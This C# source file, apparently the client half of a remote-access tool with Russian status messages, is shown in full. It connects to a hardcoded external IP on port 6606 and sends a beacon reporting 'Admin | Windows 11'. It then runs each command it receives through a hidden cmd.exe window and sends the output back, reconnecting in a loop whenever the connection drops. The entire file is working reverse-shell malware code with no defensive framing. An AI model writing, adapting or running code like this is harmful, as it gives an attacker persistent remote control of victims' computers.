// language: C#, file: Program.cs, project: SosokClientApp
using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace SosokClientApp
{
    public class Packet
    {
        public string Type { get; set; } = "";
        public string Action { get; set; } = "";
        public string Payload { get; set; } = "";
        public string ClientId { get; set; } = "";

        public string Serialize() => JsonSerializer.Serialize(this);
        public static Packet? Deserialize(string json) => JsonSerializer.Deserialize<Packet>(json);
    }

    class Program
    {
        static async Task Main(string[] args)
        {
            string host = "185.183.162.48";
            int port = 6606;
            string clientId = "TEST-123";

            Console.WriteLine($"[*] Попытка подключения к {host}:{port}...");

            while (true)
            {
                try
                {
                    using TcpClient client = new TcpClient();
                    await client.ConnectAsync(host, port);

                    var stream = client.GetStream();
                    Console.WriteLine("[+] Успешно подключено к серверу!");

                    var info = new Packet { Type = "INFO", ClientId = clientId, Payload = "Admin | Windows 11" };
                    await SendPacket(stream, info);

                    byte[] lenBuffer = new byte[4];
                    while (client.Connected)
                    {
                        await stream.ReadExactlyAsync(lenBuffer, 0, 4);
                        int len = BitConverter.ToInt32(lenBuffer, 0);
                        byte[] data = new byte[len];
                        await stream.ReadExactlyAsync(data, 0, len);

                        var packet = Packet.Deserialize(Encoding.UTF8.GetString(data));

                        if (packet?.Type == "CMD" && packet.Action == "SHELL")
                        {
                            Console.WriteLine($"[CMD] Выполняем: {packet.Payload}");
                            string output = ExecuteShell(packet.Payload);
                            var resp = new Packet { Type = "RESP", Action = "SHELL", Payload = output, ClientId = clientId };
                            await SendPacket(stream, resp);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Ошибка: {ex.Message}. Переподключение...");
                    await Task.Delay(3000);
                }
            }
        }

        private static string ExecuteShell(string command)
        {
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8
                };

                using var process = Process.Start(psi);
                string output = process?.StandardOutput.ReadToEnd() ?? "";
                string error = process?.StandardError.ReadToEnd() ?? "";

                return string.IsNullOrWhiteSpace(error) ? output : output + "\n[ERROR]\n" + error;
            }
            catch (Exception ex)
            {
                return "Error: " + ex.Message;
            }
        }

        private static async Task SendPacket(NetworkStream stream, Packet packet)
        {
            string json = packet.Serialize();
            byte[] data = Encoding.UTF8.GetBytes(json);
            byte[] len = BitConverter.GetBytes(data.Length);

            await stream.WriteAsync(len, 0, len.Length);
            await stream.WriteAsync(data, 0, data.Length);
        }
    }
}